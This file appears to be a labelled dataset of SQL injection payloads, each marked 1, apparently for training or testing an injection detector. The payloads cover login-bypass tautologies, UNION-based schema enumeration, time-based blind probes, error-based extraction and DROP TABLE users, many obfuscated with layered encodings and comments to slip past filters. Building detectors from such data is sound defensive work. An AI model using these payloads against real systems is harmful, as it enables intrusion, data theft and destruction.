"admin%27%20OR%20%271%27%3D%271 # more_noise", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020--", 1
"1'%20%20%20%20OR%20%2%30%%320%20IF(substring(%64atabas%65(),%20%%320%2%30%201,%20%2%30%2%30%201)  =  %27a',%20%20%20%2%30SLEEP(5),%20%20%20%20%30)%20%20%%320%20--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"tEsT' or '1'='1' /* AND 'a'='a'", 1
"1'ORasci%69(subst%72in%67%28dat%61base(),/*%0d%0a*/1,1))>100 OR %27b'='b%27--", 1
"1)%20UNION%20SELECT%201,database(),3--", 1
"%27%20OR%20%271%27%3D%271", 1
"1)%20UNION%20SELECT%201,database(),3----m040ljugr8", 1
"a%64min%27OR%0a%271%27%3D%27%31%0d%0a", 1
"admin'/*!12345*/OR '1'LIKE'1#prjl3w", 1
"' AND 1=1  OR 'b'='b'--", 1
"'/*%2a/OR%09%09%%30%39%091  =%091%%30%39%09%09%09--%09%09%09%09", 1
"1'/*!*/AND substring(database(), 1, 1) = 's'  /*!*/AND 1=1--", 1
"'/**/AND 1=convert(int,@@version) AND 'a'='a'--", 1
"1%27%2%30O%52%20ascii%2%38subs%74ring%28database%28%29%2C%%3201%2C%%3201%29%2%39%20%3E%20100%20--", 1
"WAITFOR%2520DELAY%2520%25270%3A0%3A5%2527--", 1
"%27%20AND%201%3D1%20%20%2F%2A%21%2A%2FAND%201%3D1--%20", 1
"%27%2F%2A%2A%2FA%254eD%20extractvalue%2528%2531%2Cconcat%25280x5c%2Cversion%28%2529%29%29--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--lftscl", 1
"' OR '1'='1#ihn2nwjdvdc5", 1
"1)) UNION %53ELEC%54 1%2cdatabase(),3%2d-", 1
"1))/**/UNION%20%20SELECT%20%201,database(),3%20%20--%20%20random_noise--", 1
"'%20%20%20%20AND%20%20%20%201%09=", 1
"convert(int,@@version)--", 1
"'/*!12345*/OR '1'='1", 1
"WAITFOR%20DELAY%20%270:0:5%27--", 1
"1'			Or			if(sUBstRiNG(DatABASe(),			1,			1)  IN (1)%09'a',			SleEP(5),			0)			--", 1
"; DROP TABLE users; --#9min5aadomlcv", 1
";DRO%50TAB%4cEus%65rs;", 1
"--#d2qtvm5q9%62khkzw", 1
"waItFOr/**/del%41Y/**/'%30:0:%35'--", 1
"%31/**/&& (%31=1)1=1--%77%70uj3jya6knba", 1
"1)%%320%55N%49ON%20SELECT%201,database(),3-%2d -- random_noise", 1
"1) UNION SELECT 1,database(),3 /*!*/AND 1=1--", 1
"' AND 1=convert(int,@@version)----z1lkida6t6z", 1
"'/**/AND/**/1=%31/**/%2d-/**/", 1
"; SELECT pg_sleep(5); ----42h7pmcgcq0666", 1
";%20DROP%20TABLE%20users;%20--#k2cpm5j6", 1
"1%20A%4eD%201%3E%%33D1", 1
"1%29uNI%254fn%250%2561S%2565LECT%250a1%2CdAtAB%2561sE%28%29%2C3--%2F%2A%250a%2A%2F", 1
"%27%20UN/*!*/ION%20SELECT%201,2,3 OR 'b'='b'--", 1
"; D%52%4fP T%41BLE users; --", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020 AND 'a'='a'--", 1
"test%27%20OR%20%271%27%3D%271%27%20%20%20%20OR%20%20%20'b' =	'b'--%20", 1
"%u0027			AND			1%20=	1			--", 1
"WAITFOR/**/DELAY%20%20%20%20%270:0:5%27--", 1
"' and 1>=1 --", 1
"WAITFOR/**/DE%4cAY%09%270:%30:5'--", 1
"; se%4cecT %70%47%5fslEep(5); ----y2hXczq5vA", 1
"te%73t%27/**/O%52/**/%27%31%27%3D%271%27/%2a*/--/**/", 1
"%27%20A/**/ND%201%3Dconvert(int,@@version)--", 1
"aDMIn%27%20OR%20%271%27%3D%271", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27--", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--", 1
"%u0027%u0020aND%u00201=conVERt(inT,@@vErsIOn)--", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%20OR%20%27b%27%3D%27b%27--%25u0020", 1
"WAITFOR DELAY '0:0:5' -- random_noise--#h8bwa9gc", 1
"'OR1=1%0a--", 1
"1))%u0020%55NIO%4e%u0020SEL%45CT%u00201,database(),%33 -- random_noise--", 1
"WAITFOR%u0020%u0020DELAY%u0020%u0020%u00270:0:5%u0027--", 1
"' OR '1'='1 OR 'b'='b'--un662g67cu", 1
"'/**/AND/**/1=convert(int,@@version)----n4q50km", 1
"WAITFOR/**/    DELAY     '0:0:5'--", 1
"%27%20AN%2544%201%3D1%20-%252d%20", 1
"'/**/OR/**/1LIKE1/**/--/**/", 1
"%3B%20DROP%20TABLE%20users%3B%20--", 1
"1%27%20oR%20ASCiI(SUbSTring(DAtaBasE(),%201,%201))%20%3E%20100%20--", 1
"%2%37%%320AND%20ex%74ractva%6cue%281%2Cconcat%280x5c%%32Cvers%69on%28%29%29%29--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#1hp8nznp8i8k", 1
"1%u0027%u0020Or%u0020if(SubsTrInG(DatabASE(),%u00201,%u00201)LIKE%u0027a%u0027,%u0020SLeeP(5),%u00200)%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
"1%27%20uNion%20sElECt%20taBLE_Name%2C%20nuLl%2C%20nULL%20FroM%20iNFoRmATIon_scHema.TaBles%20----27xprwq", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--#padzl", 1
"1)%u0%3020UNION%u0%302%30SELECT%u00201,data%62ase()%2c3--%0a%72ando%6d_noise--/*%0d%0a*/", 1
"'%20%20%20%20%20OR%20%20%20%20%201%09=	1%20%20%20%20%20--%20%20%20%20%20#kxn51slvk", 1
"1%u0027%u0020oR%u0020iF(SubSTRING(DATABaSe(),%u00201,%u00201)=%u0027a%u0027,%u0020SleEP(5),%u00200)%u0020--", 1
"%3B%2F%2A%2A%2FDROP%%320TAB%4cE%%320users%3B%20-%2d", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----a63v7htap5", 1
"WAITFOR/*!*/DELAY '0:0:5' OR (1)--", 1
"WAITFORDELAY%270:0:5%27--/*%0a*/", 1
"%u0027%u0020AND%u00201<=1%u0020%2d-%20", 1
"1'ANDsubstri%6e%67(database()%2c%31,", 1
"1)%0a=%27s' /*!*/AND 1=1--", 1
"1%u0020AND%u00201/**/=	1%u0020--%u0020random_noise", 1
"1'%09%09OR%09%09ascii(substring(database(),%09%091,%09%091))%09%09>%09%09100%09%09--", 1
"test%27%20%7C%7C%20%281%3C%3D1%29%271%27%3D%271%27%20%2F%2A", 1
"'OR%0d%0aEXISTS(SELECT1FROMusers)--", 1
"1'          AND          substring(database(),          1,          1)           =%20          's'          --#7ymmwkw9w", 1
"test%27%20OR%20%271%27%3D%25271%27%2520%2F%2A", 1
"' OR 1=1 -- --3vjiauujtl", 1
"' OR EXISTS(SELECT 1 FROM users)--#q5exr9oq8v2", 1
"%25u0027%2F%2A%2A%2FA/**/ND%2F%2A%2A%2Fextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
"%u0%3027AN%441=1", 1
"--", 1
"%0d%0a", 1
"1/**/AND/%2a*/1%3D%31-%2dtnfwlg5b1", 1
"1%20AND%20%31%3D1", 1
"'/**/oR exIsTS(sELEcT 1 frOm uSeRs)--", 1
"WAITFOR %44ELAY '0:0:%35'-%2d", 1
"test%27%20OR%20%271%27%3D%271%27%20/*", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27----p4ligxn02s6", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"1)UNION%0aSELECT1,database(),3--", 1
"tEsT%27/*!*/OR%20%271%27%3D%271%27%20/*", 1
"%27%2F%2A%21%2A%2FAND%201%3D1%20--%20", 1
"1' AND substring(database(), 1, 1) = 's'  OR 'b'='b'--", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--", 1
"' OR 1=1 -%2d%20", 1
"' OR EXISTS(SELECT 1 FROM users)----umlpxwh", 1
"' XOR 1LIKE1 --", 1
"1%27/*!*/||%20(1%3D1)ASCii(subsTRIng(Database(),%201,%201))%20%3E%20100%20--", 1
"1'ANDsubstring(database(),1,1) =%20's'%0a--", 1
"'	UN/*!*/ION	SELECT	null,	null,	null	--	#35ewci156", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#sfkfcm296xr", 1
"1%27%20UnIOn%20seLeCT%20TABle_Name,%20NUll,%20Null%20FROm%20informaTioN_scHeMA.taBleS%20--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020 /*!*/AND 1=1--", 1
"; SELECT pg_sleep(5);  OR 'b'='b'--#r6zlmab", 1
"'/**/AND/%2a*/1%20= %63on%76ert%28i%6et%2c@@version) # more_noise--", 1
"TeSt'/**/oR/**/'1'%20=%20'1'/**//*", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20 OR (1)--", 1
"' && (1=1)extractvalue(1,concat(0x5c,version()))--", 1
"%27/**/AND%201%3D1%20--%20--nckbf", 1
"1%u0027%U0020uniON%u0020sEleCT%u0020TABLE_nAmE,%U0020nUll,%U0020NULL%U0020fROM%u0020INForMaTion_scHEmA.tableS%u0020--", 1
"%27%20OR%201%3D1%20--%20", 1
"test%27%20OR%20%271%27%3D%271%27%20 /*!*/AND 1=1--%20", 1
"%u0027%u0020AND%u00201=1%u0020--%u0020", 1
"1'/**/uNIon/**/sEleCt/**/tAble_NaME,/**/nULL,/**/nULl/**/From/**/InFOrmatIoN_SCHema.taBLEs/**/--", 1
"; Se%6cECt PG_SLEEp(5)%3b %2d-", 1
";%09%09%09%09SELECT%09%09%09%09pg_sleep(5);%09%09%09%09 OR 'b'='b'----j1wsze", 1
"'%20anD%20ExtRactValUE(1,coNCat(0x5C,vERsIOn()))--", 1
";/*!12345*/SELECT/**/pg_sleep(5);/**/--", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F%20OR%20%281%29--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--", 1
"1AND", 1
"1=1", 1
"1))/**/UNION/**/SELECT/**/1,database(),3--", 1
"1 && 1=1", 1
"WaitFor%20%20DeLaY%20%20'0:0:5'%20%20/*!*/AND%20%201%09=%201--", 1
"%31)) UNION SELECT 1,database(%29,%33-%2d AND 'a'='a'", 1
"'/*!*/unIon select 1,2,3 And 'A'='A'--", 1
"test%u0027%u0020O/*!*/R%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020", 1
"%u0027UniOnSELecT%0D%0aNUll,nuLL,nULl%0A%U0020and%u0020%u0027a%U0027=%u0027A%U0027--/*%0d%0A*/", 1
"1)%u0020UN/*!*/ION%u0020SELECT%u00201,database(),3--", 1
"admin'%20%4fR'1'	= '1", 1
"'/**/O%52	EXI%53TS(SEL%45CT	1	FROM	users)%2d-", 1
"' XOR extractvalue(1,concat(0x5c,version()))--", 1
"; DROP TABLE users; --#00iroqn2lb", 1
"%27OREXISTS(SELECT1", 1
"FROMusers) -- random_noise--/*%0a*/", 1
"%U0027%u0020And%U00201=CONVErt(iNT,@@version)%u0020#%u0020mORe_NoiSE--", 1
"%u0027%u0020OR%u0020%u00271%u0027LIKE%u00271", 1
"test%27%20O/**/R%20%271%27%3D%271%27%20%20OR%20(1)--%20", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20%20%2F%2A%21%2A%2FAND%201%3D1--%20", 1
"%61%64min' OR '1'='1", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29--", 1
"'/**/UNION/**/SELECT/**/1,2,3--", 1
"%27%%320AND%201%3Dc%6fnvert(int%2c@@versio%6e)--", 1
"'/*!12345*/O%52 '1'=%271", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3C%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"%u0027/**/UnIoN/**/selecT/**/1,2,3--", 1
"%27OR%0d%0a%271%27%3D%271%0a/**/--/**/random_noise", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))%20#%20more_noise--", 1
"%27%20AND%201%3D1%20--%20#87xhh3x", 1
"test'/*!12345*/O%52 '1'='1' %2f*", 1
"' UNION SELECT 1,2,3 OR (1)--", 1
"admin' OR '1'='1 AND 'a'='a'", 1
"'/*!12345*/OR/**/1	=%201/**/--/**/", 1
"1)) %75NIOn sElEcT %31,D%61taBAsE()%2c3--", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020--", 1
";SELE%43%54", 1
"pg_s%6ceep(5);/*%0d%0a*/--#jjmj%38q0nok%0d%0a", 1
"1%27%20%20%20%20%20%20OR%20%20%20%20%20%20ascii(substring(database(),%20%20%20%20%20%201,%20%20%20%20%20%201))%20%20%20%20%20%20%3E%20%20%20%20%20%20100%20%20%20%20%20%20--", 1
"' AND 1=1 -- #9o82ffxghjm18ft", 1
"%3B%2509%2509SELECT%2509%2509pg_sleep%285%29%3B%2509%2509----1tcsfgcaih", 1
"1%u0020AND%u00201%3d1", 1
"1'/*!12345*/Or ascii(suBstrIng(DaTABAse(), 1, 1)) > 100  aND 'A'='a'----4jh9y", 1
"1'AND%0asubstring(database(),1,1)='s'%0a/*!*/AND1=1----cujilj", 1
"admin' || '1'='1", 1
"1%u0020AND%u00201%3D1#d433o7hhe", 1
"'%2f**/AND/**/extrac%74valu%65(1,concat(0x5c,%76ersion%28)))%2d-", 1
"%3B%2520%2544ROP%20TABLE%20users%3B%20%20%23%20more_%256eois%2565-%252d%23ko4bi", 1
"1'				%09O/**/R%09	%09		IF(s%75bstring(da%74abas%65(),					1,%09				1)%20LIKE%09'a',					SLEEP(5%29,					0%29%09				--", 1
"1)UNiOnselEcT1,DATABaSE(),3--/*%0a*/", 1
"WAITFO%52 DEL%41Y '0:0:5'%2d-", 1
"test%2527%2520OR%2520%25271%2527%253D%25271%2527%2520--%2520", 1
"1%20AND%201%3D1--62187y8lvtp", 1
"' AND extractvalue(1,concat(0x5c,version())) OR (1)--", 1
"wAitFoR dElaY '0:0:5'--", 1
";DROP%0d%0aTABLEusers;%0a--", 1
"1'/*!%2a/OR IF(subst%72ing(database(%29, 1, 1)%3e='a', %53LE%45P(5), 0) %2d-", 1
"WAITFO%52	%09DELAY		'0:0:%35'--", 1
"1%25u0027%25u0020UNION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020%20--%20random_noise--", 1
"1/**/AnD 1=1 OR 'b'='b'", 1
"test%u0027%u0020O/*!*/R%u0020%u00271%u0027LIKE%u00271%u0027%u0020/*", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027--", 1
"'		AND		1%09=  convert(int,@@version)--", 1
"1%29%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cdatabase%28%29%2C3--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'--", 1
"ad%6d%69n'/*!*/OR '1'='1--%34tvci%78ay69vu680", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  OR 'b'='b'----gg0zi2", 1
"'/**/AND    extractvalue(1,concat(0x5c,version()))--", 1
"'%20OR 1IN (1)1 -%2d", 1
"test' OR '1'LIKE'1'  -- random_noise-- --xwsfqpco02a", 1
"1))UNION%0d%0aSELECT%0a1,database(),3--/*%0d%0a*/", 1
"'/**/A/*!12345*/ND/**/1=1/**/--/**/#pzvih4s8ru40", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--c4vs3ikg0", 1
"1%20AND%201%3D1%2340yoraw6cvs28", 1
"tesT%U0027/*!*/or%u0020%U00271%U0027>=%u00271%U0027%U0020--%u0020", 1
"WAITFOR      DELAY      '0:0:5'--", 1
"%u0027%u0020A/*!12345*/ND%u00201=convert(int,@@version)--", 1
"%u0027%u0020oR%u0020%u00271%u0027%3D%u00271", 1
"1%U0027%u0020or%u0020asCiI(sUbStRInG(DATabaSE(),%u00201,%u00201))%u0020>%u0020100%U0020----O5144yt1", 1
"1' Or if(sUBsTrING(DaTaBAsE(), 1, 1)='A', sleeP(5), 0) --", 1
"1)/**/uNION/**/seLeCt/**/1,dATABASe(),3--", 1
"'  UNION  SELECT  1,2,3 -- random_noise--", 1
"%61dmin'/**/OR/**%2f'1'%3c='1", 1
"test'    OR    '1' =  '1'    /*", 1
"' UNION %53ELECT null, %6eu%6cl, null --%20", 1
"'%09%09%09%09%09AND%09%09%09%09%091	=  1%09%09%09%09%09--%09%09%09%09%09", 1
"1%27%2509UnIon%250%2539SeLECT%250%2539Ta%2542LE_NAME%2C%2509NUlL%2C%2509nULl%2509f%2572oM%250%2539infoRmA%2554io%256e_sCHEmA.TA%2562leS%2509%252d-", 1
"'aNd1=1%0d%0a--", 1
"admin%2527%2520OR%2520%25271%2527%253D%25271OR%250a%27b%27%3D%27b%27%250a", 1
"1/**/AND/**/1=1", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----z6kxn3wsd", 1
";%20SELECT%20pg_sleep(5);%20--", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"1' && (1=1)substring(database(), 1, 1) = 's'  # more_noise--#yym5bdylt4v1", 1
"%27%20%20AND%20%201%20%20%3D	convert(int,@@version)--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----g7vvg3s", 1
"te%73t'%2f**/%4fR/*%2a/'1'LIKE'1'/**/--/**/", 1
"' UNION SELECT null,%20%6eull, null %2d%2d", 1
"1AND/*%0a*/1>=1/*%0a*/", 1
"test'/**/OR '1'='1' /*--1p98j9", 1
"1))/*!*/UNION SELECT 1,database(),3--#jqzxz1y8", 1
"test%27/**/OR%20%271%27%3D%271%27%20/*", 1
"1 XOR 1=1 # more_noise#hs8dgn5lcv7p1", 1
"1))%u0020UNION%u0020SELEC%54%u0020%31,database(%29,3--#f%635s%33l6a", 1
"%27%20AND%201%3Dconvert(int,@@version)--", 1
"TesT' or '1'<='1' -- --451x3s3ynb", 1
"1))UNION", 1
"SELECT%0a1,database(),3 XOR (1)--%0a", 1
"test%27%20%7C%7C%20%271%27%3D%271%27%20%2F%2A", 1
"1'/**/AND/**/sUbstriNG(dAtaBASE(),/**/1,/**/1)/**/=/**/'s'/**/--", 1
"1' OR %49F(%73ubs%74ring(databa%73e(),%201, 1)='a%27, SLEEP(5), 0) --", 1
"'/**/OR/**/'1'='1 # more_noise", 1
"test'%20%20OR%20%20'1'	=/**//**/'1'%20%20/*%20%20AND%20%20'a'	=/**//**/'a'", 1
"1) UNiOn SeLECt 1,DatABASe(),3 # more_noise--", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20", 1
"WAITFOR/**/DELAY/**/%u00270:0:5%u0027 # more_noise--", 1
"%27%20A/*!*/ND%20extractvalue(1,concat(0x5c,version()))--", 1
"TEsT%25U0027%25U0020or%25U0020%25U00271%25u0027%3d%25U00271%25U0027%25U0020%2F%2A", 1
"1))		UNION		SELECT		1,database(),3--", 1
"1)%20%55NIO%4e%20SELECT%201,%64%61tabase(),3 -- random_noise--", 1
"1%20AND%201%3D1", 1
"admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271", 1
"'%20%20%20AND%20%20%201/**//**/=%091%20%20%20--%20%20%20", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20%20OR%20%27b%27%3D%27b%27--", 1
"1%27%2F%2A%2A%2FoR%2F%2A%2A%2FasCiI%28suBSTRInG%28DataBAsE%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F OR 'b'='b'--", 1
";SELECT%0apg_sleep(5);--/*%0a*/random_noise--/*%0d%0a*/", 1
"'/**/O/*!12345*/R/**/1=1/**/--/**/", 1
"%27%2520%2520%2520%2520UNiOn%2520%2520%2520%2520seLeCT%2520%2520%2520%2520nULL%2C%2520%2520%2520%2520nUll%2C%2520%2520%2520%2520nUlL%2520%2520%2520%2520--%2520%2520%2520%2520", 1
"1%27%20AND%20sUbsTring%28daTABASE%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20--", 1
"'/**/UNION SELECT null, null, null  OR (1)-- --fe2dv5766t", 1
"aDmIn' oR '1'='1", 1
"'/*!*/OR '1'='1", 1
"admin%27%20OR%20%271%27%3D%271", 1
"%27%20AND%201%3D1%20%u0020aNd%u0020%U0027a%U0027=%U0027a%u0027--%20", 1
"%27%20XOR%20EXISTS(SEL/**/ECT%201%20FROM%20users)--", 1
"'/**/&& (1<=1)1=convert(int,@@version)--#sy2a0k1irbq1in", 1
"1 AND 1LIKE1", 1
"test%27%20OR%20%271%27%3D%271%27%20%20--%20random_noise--%20--1dkv6", 1
"test%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0027%u0020--%u0020", 1
"' and ExTrActvAlue(1,cOnCaT(0X5c,VerSiOn()))--", 1
"test'%20%4fR '1'='%31' --", 1
"1'/*!*/oR IF(SuBsTRinG(dAtabAse(), 1, 1)='A', SleEp(5), 0) --", 1
"'/**//**//**//**/AND/**//**//**//**/1%20=/**/1/**//**//**//**/--/**//**//**//**/#nbcya", 1
"tesT%U0027%u0020Or%u0020%U00271%U0027%3D%U00271%U0027%u0020--%U0020#r48Ldzn", 1
"WAITFOR/**/DELAY/**/%u00270:0:5%u0027--", 1
"'OR/*%0d%0a*/1=1--", 1
"/*%0a*/", 1
"1%25u0027%25u0020UN/*!*/ION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020--", 1
"%27%20UNION%20SELECT%201%2C2%2C3--", 1
"'  AND  extractvalue(1,concat(0x5c,version()))--", 1
"%31) %55NION SELECT %31,database(),3-%2d", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20 OR (1)--", 1
"'  OR  EXISTS(SELECT  1  FROM  users)--", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27%20%23%20more_noise--", 1
"%27%20oR%201%3D1%20--%20", 1
"1 XOR %31=1", 1
"1%29%29%20Union%20SeLECt%201%2CDATAbASe%28%29%2C3--#3HkRtSrxsxJgX", 1
"test'	OR	'1'%09=%09'1'	/*", 1
"1)) UNION SELECT 1,database(),3 /*!*/AND 1=1--", 1
"1%25u0027%25u0020OR%25u0020asCIi%28sUBstrInG%28dATAbaSE%28%29%2C%25u00201%2C%25u00201%29%29%25u0020%253E%25u0020100%25u0020--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3/**//*!*/AND/**/1=1--", 1
"' && 1=convert(int,@@version)--", 1
"1'/*!12345*/Or AsCIi(subSTriNG(dAtABASE(), 1, 1)) > 100 --", 1
"; DROP TABLE users;  OR (1)--", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27#/*%0a*/more_noise--%0a", 1
"1%u0027/*!12345*/AND%u0020substring(database(),%u00201,%u00201)%u0020>=%u0020%u0027s%u0027%u0020----jtkwk63574qa", 1
"%2527AND1%253D1%250d%250a--%250d%250a", 1
"%u0027%u0020aNd%u00201=1%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--%u0020", 1
"WAITFOR%2F%2A%21%2A%2FDELAY%20%270%3A0%3A5%27--", 1
"'/**/and 1=1 --", 1
"test' OR '%31'='1'%20/*", 1
"1aNd", 1
"1%20= 1", 1
"test%27%20OR%20%271%27%3D%271%27%20/*/**/AND/**/'a'='a'", 1
"'AND/*%0a*/1=convert(int,@@version)AND'a'='a'--%0a", 1
"test'OR/*%0d%0a*/'1'LIKE'1'/*%0a*/--", 1
";/**/SELECT/**/pg_sleep(5);/**/--", 1
"%27AND%2F%2A%25%2530d%250a%2A%252f%2565xtractvalue%281%2Cco%256ecat%280%25785c%2Cversio%256e%28%29%29%29--%2F%2A%250d%250a%2A%252f", 1
"' || eXIStS(seLecT 1 FROm users)--", 1
"1'%20||%20IF(substring(database(),%201,%201)<%09=%09'a',%20SLEEP(5),%200)%20--#pvgkorqzd90aw9", 1
"1))/*!*/UNIONSELECT%0d%0a1,database(),3--%0d%0a", 1
"1'   uNiON   sELeCt   TabLe_nAmE,   Null,   NuLl   FRoM   inFoRmation_schEMa.tAbLES   --", 1
"1'/*!12345*/AND substring(database(), 1, 1) = 's' --#i8jexs65qqxj2k9", 1
"%u0027/**/AND/**/extractvalue(1,concat(0x5c,version()))--", 1
"'AND%0a1	=  convert(int,@@version)--", 1
"1'/**/UNIONSELECTtable_name,null,/*%0a*/nullFROM%0d%0ainformation_schema.tables--", 1
"%25u0027%25u0020O%2F%2A%21%2A%2FR%25u00201%3D1%25u0020--%25u0020#oqxrjm", 1
"WAITFORDELAY%270%3A0%3A5%27--%0A", 1
